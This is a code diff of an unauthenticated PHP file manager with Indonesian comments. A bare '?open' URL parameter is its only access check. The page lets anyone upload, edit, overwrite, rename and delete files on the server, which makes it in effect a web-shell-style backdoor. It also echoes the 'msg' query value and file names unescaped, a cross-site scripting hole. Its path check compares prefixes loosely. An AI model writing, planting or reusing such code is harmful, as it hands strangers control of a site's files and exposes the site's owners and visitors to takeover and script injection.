@@ -3,87 +3,91 @@
  * Modern PHP File Manager (No Auth)
  ****************************/
 
+// Akses hanya dengan query ?open
 if (!isset($_GET['open'])) {
     die("Akses ditolak. Gunakan ?open untuk mengakses file manager.");
 }
 
-$ROOT_DIR = __DIR__;
+// Ubah $ROOT_DIR sesuai kebutuhan, misalnya '/home/tutorzoo' jika ingin root dari sana
+$ROOT_DIR = __DIR__; // direktori dasar, ubah ke '/home/tutorzoo' jika diperlukan
 
-function safe_path($root, $relPath) {
-    $base = realpath($root);
-    $real = realpath($root . '/' . $relPath);
-    if ($real === false || strpos($real, $base) !== 0) {
+function safe_path($root, $path) {
+    $real = realpath($root . '/' . $path);
+    if ($real === false || strncmp($real, realpath($root), strlen(realpath($root))) !== 0) {
         return false;
     }
     return $real;
 }
 
-$cwd = isset($_GET['p']) ? trim($_GET['p'], '/') : '';
+$cwd = isset($_GET['p']) ? $_GET['p'] : '';
 $currentDir = safe_path($ROOT_DIR, $cwd);
-if ($currentDir === false) {
-    $cwd = '';
-    $currentDir = $ROOT_DIR;
-}
+if ($currentDir === false) $currentDir = $ROOT_DIR;
 
 $msg = "";
 
-/* ===== Actions ===== */
-
+// ==== Actions ====
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     $action = $_POST['action'];
 
-    function path_in_cwd($name){
-        global $currentDir;
-        return safe_path($currentDir, $name);
-    }
-
     if ($action === 'upload' && isset($_FILES['file'])) {
-        move_uploaded_file($_FILES['file']['tmp_name'],
-            $currentDir . '/' . basename($_FILES['file']['name']));
+        $fname = basename($_FILES['file']['name']);
+        move_uploaded_file($_FILES['file']['tmp_name'], $currentDir.'/'.$fname);
         $msg = "File berhasil di-upload";
     }
 
     if ($action === 'rename') {
-        $old = path_in_cwd($_POST['old']);
-        $new = path_in_cwd($_POST['new']);
+        $old = safe_path($currentDir, $_POST['old']);
+        $new = safe_path($currentDir, $_POST['new']);
         if ($old && $new) rename($old, $new);
         $msg = "Nama berhasil diubah";
     }
 
     if ($action === 'delete') {
-        $t = path_in_cwd($_POST['target']);
-        if ($t && is_file($t)) unlink($t);
-        elseif ($t && is_dir($t)) rmdir($t);
+        $target = safe_path($currentDir, $_POST['target']);
+        if ($target && is_file($target)) unlink($target);
+        elseif ($target && is_dir($target)) rmdir($target);
         $msg = "Berhasil dihapus";
     }
 
     if ($action === 'save') {
-        $f = path_in_cwd($_POST['file']);
+        $f = safe_path($currentDir, $_POST['file']);
         if ($f && is_file($f)) file_put_contents($f, $_POST['content']);
         $msg = "Perubahan disimpan";
     }
 
     if ($action === 'create_folder') {
-        $name = trim($_POST['folder_name']);
-        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $name))
-            $msg = "Nama folder tidak valid";
-        elseif (file_exists($currentDir.'/'.$name))
+        $fname = trim($_POST['folder_name']);
+        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fname)) {
+            $msg = "Nama folder tidak valid (hanya alfanumerik, _, -, .)";
+        } elseif (file_exists($currentDir . '/' . $fname)) {
             $msg = "Folder sudah ada";
-        else {
-            mkdir($currentDir.'/'.$name);
+        } else {
+            mkdir($currentDir . '/' . $fname);
             $msg = "Folder berhasil dibuat";
         }
     }
 
     if ($action === 'create_file') {
-        $name = trim($_POST['file_name']);
-        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $name))
-            $msg = "Nama file tidak valid";
-        elseif (file_exists($currentDir.'/'.$name))
+        $fname = trim($_POST['file_name']);
+        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fname)) {
+            $msg = "Nama file tidak valid (hanya alfanumerik, _, -, .)";
+        } elseif (file_exists($currentDir . '/' . $fname)) {
             $msg = "File sudah ada";
-        else {
-            file_put_contents($currentDir.'/'.$name,'');
+        } else {
+            file_put_contents($currentDir . '/' . $fname, '');
             $msg = "File berhasil dibuat";
+        }
+    }
+
+    if ($action === 'cd') {
+        $newPath = trim($_POST['cd_path']);
+        $newDir = safe_path($ROOT_DIR, $newPath);
+        if ($newDir !== false) {
+            $cwd = $newPath;
+            $currentDir = $newDir;
+            $msg = "Berpindah ke direktori: " . $newPath;
+        } else {
+            $msg = "Path tidak valid atau di luar root.";
         }
     }
 
@@ -91,18 +95,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     exit;
 }
 
-/* ===== Edit mode ===== */
-
 $editFile = null;
 if (isset($_GET['edit'])) {
-    $f = safe_path($currentDir, $_GET['edit']);
-    if ($f && is_file($f)) $editFile = $f;
+    $editPath = safe_path($currentDir, $_GET['edit']);
+    if ($editPath && is_file($editPath)) $editFile = $editPath;
 }
 
 $items = scandir($currentDir);
 ?>
 <!doctype html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <title>Modern File Manager</title>
@@ -114,86 +116,152 @@ body{background:#f6f7fb}
 .badge-folder{background:#e9f2ff;color:#2c67ff}
 .badge-file{background:#f3f3f6;color:#555}
 .table td,.table th{vertical-align:middle}
+input[type=text]{max-width:140px}
 </style>
 </head>
 <body>
 <div class="container py-4">
 
-<h3 class="fw-semibold mb-2">File Manager</h3>
+    <div class="mb-3">
+        <h3 class="fw-semibold mb-1">File Manager</h3>
+        <div class="text-secondary">Modern • Minimal • Clean UI</div>
+    </div>
 
-<?php if(isset($_GET['msg'])): ?>
-<div class="alert alert-success card-modern mb-3"><?=$_GET['msg']?></div>
-<?php endif; ?>
+    <?php if (isset($_GET['msg'])): ?>
+        <div class="alert alert-success shadow-sm card-modern mb-3"><?=$_GET['msg']?></div>
+    <?php endif; ?>
 
-<div class="card card-modern shadow-sm mb-3">
-<div class="card-body">
+    <div class="card card-modern shadow-sm mb-4">
+        <div class="card-body d-flex flex-wrap justify-content-between align-items-center gap-2">
+            <div>
+                <strong class="text-secondary">Path</strong> :
+                <?php
+                $absPath = $currentDir; // Menggunakan $currentDir sebagai pwd (path absolut)
+                $parts = explode('/', trim($absPath, '/'));
+                $pathBuild = "";
+                echo '<a class="link-primary" href="?open">/</a>';
+                foreach ($parts as $part) {
+                    if ($part === "") continue;
+                    $pathBuild .= "/$part";
+                    // Hitung path relatif dari $ROOT_DIR untuk link navigasi
+                    $rootAbs = realpath($ROOT_DIR);
+                    if (strpos($pathBuild, $rootAbs) === 0) {
+                        $rel = substr($pathBuild, strlen($rootAbs) + 1);
+                        echo ' <a class="link-primary" href="?open&p='.urlencode($rel).'">'.$part.'</a> /';
+                    } else {
+                        // Jika di luar $ROOT_DIR, tampilkan tanpa link
+                        echo ' ' . $part . ' /';
+                    }
+                }
+                ?>
+            </div>
 
-<strong>Path :</strong>
+            <div class="d-flex gap-2 flex-wrap">
+                <form method="post" class="d-flex gap-2">
+                    <input type="hidden" name="action" value="cd">
+                    <input type="text" name="cd_path" class="form-control form-control-sm" placeholder="Path relatif dari root" value="<?=htmlspecialchars($cwd)?>" required>
+                    <button class="btn btn-secondary btn-sm px-3">Go</button>
+                </form>
 
-<?php
-echo '<a href="?open&p=">/</a>';
-if ($cwd !== '') {
-    $parts = explode('/', $cwd);
-    $build = '';
-    foreach ($parts as $p) {
-        $build .= ($build ? '/' : '') . $p;
-        echo ' / <a href="?open&p='.urlencode($build).'">'.$p.'</a>';
-    }
-}
-?>
+                <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
+                    <input type="hidden" name="action" value="upload">
+                    <input type="file" name="file" class="form-control form-control-sm" required>
+                    <button class="btn btn-primary btn-sm px-3">Upload</button>
+                </form>
 
-</div>
-</div>
+                <form method="post" class="d-flex gap-2">
+                    <input type="hidden" name="action" value="create_folder">
+                    <input type="text" name="folder_name" class="form-control form-control-sm" placeholder="Nama Folder" required>
+                    <button class="btn btn-success btn-sm px-3">Buat Folder</button>
+                </form>
 
-<div class="card card-modern shadow-sm">
-<table class="table mb-0">
-<thead class="table-light">
-<tr><th>Nama</th><th>Tipe</th><th>Ukuran</th><th class="text-end">Aksi</th></tr>
-</thead>
-<tbody>
+                <form method="post" class="d-flex gap-2">
+                    <input type="hidden" name="action" value="create_file">
+                    <input type="text" name="file_name" class="form-control form-control-sm" placeholder="Nama File" required>
+                    <button class="btn btn-info btn-sm px-3">Buat File</button>
+                </form>
+            </div>
+        </div>
+    </div>
 
-<?php
-foreach ($items as $it){
-    if ($it === '.') continue;
+    <?php if ($editFile): ?>
+    <div class="card card-modern shadow-sm mb-4">
+        <div class="card-header bg-white fw-semibold">
+            Edit File — <?=basename($editFile)?>
+        </div>
+        <div class="card-body">
+            <form method="post">
+                <input type="hidden" name="action" value="save">
+                <input type="hidden" name="file" value="<?=htmlspecialchars($_GET['edit'])?>">
+                <textarea name="content" rows="12" class="form-control mb-3"><?=htmlspecialchars(file_get_contents($editFile))?></textarea>
+                <div class="d-flex gap-2">
+                    <button class="btn btn-primary px-3">Simpan</button>
+                    <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-outline-secondary">Batal</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <?php endif; ?>
 
-    // tombol naik level
-    if ($it === '..' && $cwd !== '') {
-        $up = dirname($cwd);
-        if ($up === '.') $up = '';
-        echo '<tr><td><a href="?open&p='.urlencode($up).'">..</a></td>
-              <td>Folder</td><td>—</td><td></td></tr>';
-        continue;
-    }
-    if ($it === '..') continue;
+    <div class="card card-modern shadow-sm">
+        <div class="table-responsive">
+        <table class="table mb-0">
+            <thead class="table-light">
+            <tr>
+                <th>Nama</th>
+                <th>Tipe</th>
+                <th>Ukuran</th>
+                <th class="text-end">Aksi</th>
+            </tr>
+            </thead>
+            <tbody>
+            <?php foreach ($items as $it):
+                if ($it === '.') continue;
+                if ($it === '..' && $currentDir === $ROOT_DIR) continue;
+                $rel = trim(($cwd ? $cwd.'/' : '').$it,'/');
+                $full = safe_path($currentDir, $it);
+                if ($full === false) continue;
+                $isDir = is_dir($full);
+            ?>
+            <tr>
+                <td class="fw-medium">
+                    <?php if ($isDir): ?>
+                        <span class="badge badge-folder me-1">Folder</span>
+                        <a href="?open&p=<?=urlencode($rel)?>" class="link-body-emphasis"><?=$it?></a>
+                    <?php else: ?>
+                        <span class="badge badge-file me-1">File</span>
+                        <?=$it?>
+                    <?php endif; ?>
+                </td>
+                <td><?=$isDir ? 'Folder' : 'File'?></td>
+                <td><?=$isDir ? '—' : filesize($full).' bytes'?></td>
+                <td class="text-end">
+                    <?php if(!$isDir): ?>
+                        <a class="btn btn-sm btn-outline-primary"
+                           href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">Edit</a>
+                    <?php endif; ?>
 
-    $rel = ($cwd ? $cwd.'/' : '') . $it;
-    $full = safe_path($ROOT_DIR, $rel);
-    if (!$full) continue;
+                    <form method="post" class="d-inline"
+                          onsubmit="return confirm('Hapus item ini?')">
+                        <input type="hidden" name="action" value="delete">
+                        <input type="hidden" name="target" value="<?=htmlspecialchars($it)?>">
+                        <button class="btn btn-sm btn-outline-danger">Delete</button>
+                    </form>
 
-    $isDir = is_dir($full);
-?>
-<tr>
-<td>
-<?php if($isDir): ?>
-<span class="badge badge-folder me-1">Folder</span>
-<a href="?open&p=<?=urlencode($rel)?>"><?=$it?></a>
-<?php else: ?>
-<span class="badge badge-file me-1">File</span><?=$it?>
-<?php endif; ?>
-</td>
-<td><?=$isDir?'Folder':'File'?></td>
-<td><?=$isDir?'—':filesize($full).' bytes'?></td>
-<td class="text-end">
-<?php if(!$isDir): ?>
-<a class="btn btn-sm btn-outline-primary"
- href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">Edit</a>
-<?php endif; ?>
-</td>
-</tr>
-<?php } ?>
-</tbody>
-</table>
-</div>
+                    <form method="post" class="d-inline">
+                        <input type="hidden" name="action" value="rename">
+                        <input type="hidden" name="old" value="<?=htmlspecialchars($it)?>">
+                        <input type="text" name="new" class="form-control form-control-sm d-inline"
+                               placeholder="rename">
+                        <button class="btn btn-sm btn-outline-secondary">OK</button>
+                    </form>
+                </td>
+            </tr>
+            <?php endforeach; ?>
+            </tbody>
+        </table>
+        </div>
+    </div>
 
 </div>
 </body>
